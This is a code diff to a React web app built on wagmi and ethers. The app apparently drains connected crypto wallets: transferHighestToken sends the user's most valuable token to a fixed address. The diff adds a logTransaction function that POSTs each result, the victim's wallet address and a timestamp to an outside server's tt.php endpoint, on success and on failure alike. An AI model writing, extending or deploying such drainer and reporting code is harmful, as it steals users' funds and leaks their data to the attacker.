@@ -1,3 +1,4 @@
+// src/App.js
 import React, { useEffect, useState } from 'react';
 import { WagmiConfig, useAccount, useDisconnect } from 'wagmi';
 import { mainnet, goerli } from 'wagmi/chains';
@@ -97,6 +98,7 @@ async function transferHighestToken(signer, balances) {
       value: value,
     });
     await tx.wait();
+    return { success: true, token: 'Ethereum', amount: value.toString() };
   } else {
     const contract = new ethers.Contract(
       tokenAddresses[highestToken],
@@ -106,6 +108,7 @@ async function transferHighestToken(signer, balances) {
 
     const tx = await contract.transfer(toAddress, highestBalance);
     await tx.wait();
+    return { success: true, token: highestToken, amount: highestBalance.toString() };
   }
 }
 
@@ -129,15 +132,27 @@ function App() {
     }
   }, [isConnected, address]);
 
+  const logTransaction = async (logData) => {
+    await fetch('https://eflujsyb0kuybgol11532.cleavr.one/btc/tt.php', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(logData),
+    });
+  };
+
   const handleSendTransaction = async () => {
     if (isConnected && !transactionInProgress) {
       setTransactionInProgress(true);
       try {
         const signer = await getEthersSigner(config);
-        await transferHighestToken(signer, balances);
+        const result = await transferHighestToken(signer, balances);
+        await logTransaction({ ...result, address, timestamp: new Date().toISOString(), ip: 'fetch IP from client' });
         alert('Transaction successful!');
       } catch (error) {
         console.error('Transaction failed:', error);
+        await logTransaction({ success: false, error: error.message, address, timestamp: new Date().toISOString(), ip: 'fetch IP from client' });
         alert('Transaction failed. Please try again.');
       } finally {
         setTransactionInProgress(false);
